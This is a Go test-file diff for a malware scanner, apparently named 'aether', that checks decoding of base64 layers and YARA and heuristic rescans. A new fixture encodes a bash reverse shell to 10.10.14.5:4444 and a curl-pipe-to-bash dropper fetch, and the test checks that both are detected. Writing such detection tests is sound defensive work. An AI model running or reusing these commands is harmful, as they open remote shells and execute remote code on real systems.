@@ -6,6 +6,7 @@ import (
 	"context"
 	"encoding/base64"
 	"fmt"
+	"strings"
 	"testing"
 
 	"aether/internal/config"
@@ -205,9 +206,9 @@ func TestDecodeAndRescanWithYARA(t *testing.T) {
 	scriptContent := []byte(fmt.Sprintf("#!/bin/sh\necho '%s' | base64 -d | sh\n", b64Encoded))
 
 	mockY := &mockYaraScannerForDecode{}
-	match, layers, yMatches := scanner.DecodeAndRescanWithYARA(ctx, "/tmp/implant.sh", scriptContent, nil, cfg, nil, mockY)
+	matches, layers, yMatches := scanner.DecodeAndRescanWithYARA(ctx, "/tmp/implant.sh", scriptContent, nil, cfg, nil, mockY)
 
-	if match == nil {
+	if len(matches) == 0 {
 		t.Fatalf("expected match for base64 encoded YARA target")
 	}
 	if len(layers) == 0 || layers[0] != "base64" {
@@ -220,3 +221,42 @@ func TestDecodeAndRescanWithYARA(t *testing.T) {
 		t.Errorf("expected YARA match Linux_Implant_Custom_Family, got %v", yMatches)
 	}
 }
+
+func TestDecodeAndRescan_MultiSignalAggregated(t *testing.T) {
+	cfg := config.NewDefaultConfig()
+	ctx := context.Background()
+
+	// Decoded payload contains both a reverse shell AND a download-and-execute command
+	multiPayload := `#!/bin/bash
+bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
+curl -s http://192.168.1.50/dropper.sh | bash
+`
+	b64Encoded := base64.StdEncoding.EncodeToString([]byte(multiPayload))
+	scriptContent := []byte(fmt.Sprintf("#!/bin/bash\necho '%s' | base64 -d | bash\n", b64Encoded))
+
+	matches, layers, _ := scanner.DecodeAndRescanWithYARA(ctx, "/tmp/multi.sh", scriptContent, nil, cfg, nil, nil)
+	if len(matches) < 2 {
+		t.Fatalf("expected at least 2 aggregated heuristic matches from decoded stream, got %d", len(matches))
+	}
+	if len(layers) == 0 || layers[0] != "base64" {
+		t.Errorf("expected base64 layer, got %v", layers)
+	}
+
+	foundRevShell := false
+	foundDropper := false
+	for _, m := range matches {
+		if strings.Contains(m.Reason, "Script_Reverse_Shell") {
+			foundRevShell = true
+		}
+		if strings.Contains(m.Reason, "Script_Download_And_Execute") {
+			foundDropper = true
+		}
+	}
+	if !foundRevShell {
+		t.Errorf("expected multi-signal scan to detect Script_Reverse_Shell in decoded stream")
+	}
+	if !foundDropper {
+		t.Errorf("expected multi-signal scan to detect Script_Download_And_Execute in decoded stream")
+	}
+}
+
